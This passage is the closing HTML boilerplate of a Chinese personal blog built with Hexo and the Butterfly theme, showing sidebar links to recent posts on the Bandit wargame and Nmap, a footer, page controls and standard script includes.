title="发表于 2024-08-05 19:51:32">2024-08-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/07/26/WarGames%E4%B9%8BBandit/" title="WarGames之Bandit">WarGames之Bandit</a><time datetime="2024-07-26T08:47:22.000Z" title="发表于 2024-07-26 16:47:22">2024-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/07/23/Nmap/" title="Nmap">Nmap</a><time datetime="2024-07-23T08:15:55.000Z" title="发表于 2024-07-23 16:15:55">2024-07-23</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Wowonniu</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
